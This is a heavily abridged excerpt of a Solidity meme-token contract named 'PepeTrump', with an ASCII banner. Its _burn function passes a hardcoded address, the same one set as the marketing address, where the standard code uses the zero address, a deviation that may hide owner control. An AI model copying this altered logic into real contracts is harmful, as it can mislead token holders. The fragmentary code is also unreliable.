...
\______   \ ____ ______   ___\__    ___/______ __ __  _____ ______  
 |     ___// __ \\____ \_/ __ \|    |  \_  __ \  |  \/     \\____ \ 
 |    |   \  ___/|  |_> >  ___/|    |   |  | \/  |  /  Y Y  \  |_> >
 |____|    \___  >   __/ \___  >____|   |__|  |____/|__|_|  /   __/ 
               \/|__|        \/                           \/|__|    
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _beforeTokenTransfer(account, address(0x1D840A4Ab92b5A726087AA5081A87e3A11870162), amount);
...
contract PepeTrump is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("PepeTrump", "PEPETRUMP") {
        ...
        uint256 totalSupply = 1_100_000 * (10 ** 18);
        supply += totalSupply;
        ...
        marketingAddress = 0x1D840A4Ab92b5A726087AA5081A87e3A11870162;
